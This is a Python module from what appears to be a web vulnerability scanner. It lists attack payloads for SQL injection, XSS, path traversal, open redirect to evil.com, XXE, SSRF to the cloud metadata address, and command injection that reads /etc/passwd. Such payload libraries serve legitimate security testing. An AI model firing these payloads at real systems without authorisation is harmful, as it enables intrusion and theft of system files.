"""
Vulnerability Payload Database v4.0
Centralised payloads used across all scanner modules.
"""

# ── SQL Injection ─────────────────────────────────────────────────────────
SQLI_PAYLOADS = {
    'error_based': [
        "'",
        '"',
        "')",
        '")',
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 1=1#",
        '" OR "1"="1',
        '" OR 1=1--',
        "' OR 'a'='a",
        "') OR ('1'='1",
        "' AND 1=1--",
        "' AND 1=2--",
    ],
    'union_based': [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT @@version--",
        "' UNION SELECT database(),user()--",
    ],
    'time_based': [
        "' AND SLEEP(5)--",
        "' AND pg_sleep(5)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    ],
    'boolean_based': [
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND 'a'='a",
        "' AND 'a'='b",
    ],
}

# ── XSS ──────────────────────────────────────────────────────────────────
XSS_PAYLOADS = {
    'basic': [
        "<script>alert('XSS')</script>",
        "<script>alert(1)</script>",
        "<script>confirm('XSS')</script>",
    ],
    'img_tag': [
        "<img src=x onerror=alert('XSS')>",
        "<img src=x onerror=alert(1)>",
    ],
    'svg_tag': [
        "<svg onload=alert('XSS')>",
        "<svg/onload=alert(1)>",
    ],
    'event_handlers': [
        '" onfocus="alert(1)" autofocus="',
        "' onfocus='alert(1)' autofocus='",
        '" onmouseover="alert(1)"',
    ],
    'polyglots': [
        '"><svg/onload=alert(1)>',
        "'><img src=x onerror=alert(1)>",
    ],
}

# ── Directory Traversal ──────────────────────────────────────────────────
TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "..%5c..%5c..%5cwindows%5cwin.ini",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "/etc/passwd",
    "C:/windows/win.ini",
]

# ── Open Redirect ────────────────────────────────────────────────────────
OPEN_REDIRECT_PAYLOADS = [
    "//evil.com",
    "https://evil.com",
    "http://evil.com",
    "/\\evil.com",
    "///evil.com",
    "//evil.com/",
    "https://evil.com/",
]

# ── XXE ──────────────────────────────────────────────────────────────────
XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">]><foo>&xxe;</foo>',
]

# ── SSRF ─────────────────────────────────────────────────────────────────
SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1/",
    "http://localhost/",
    "http://0.0.0.0/",
    "http://[::1]/",
]

# ── Command Injection ────────────────────────────────────────────────────
CMDI_PAYLOADS = [
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "$(cat /etc/passwd)",
    "; whoami",
    "| whoami",
    "; sleep 5",
    "| sleep 5",
]


def get_payloads(vuln_type: str, category: str = None) -> list:
    """Get payloads for a specific vulnerability type."""
    payload_map = {
        'sqli':      SQLI_PAYLOADS,
        'xss':       XSS_PAYLOADS,
        'traversal': TRAVERSAL_PAYLOADS,
        'redirect':  OPEN_REDIRECT_PAYLOADS,
        'cmdi':      CMDI_PAYLOADS,
        'xxe':       XXE_PAYLOADS,
        'ssrf':      SSRF_PAYLOADS,
    }
    payloads = payload_map.get(vuln_type.lower(), [])
    if isinstance(payloads, dict):
        if category:
            return payloads.get(category, [])
        return [p for cat in payloads.values() for p in cat]
    return payloads
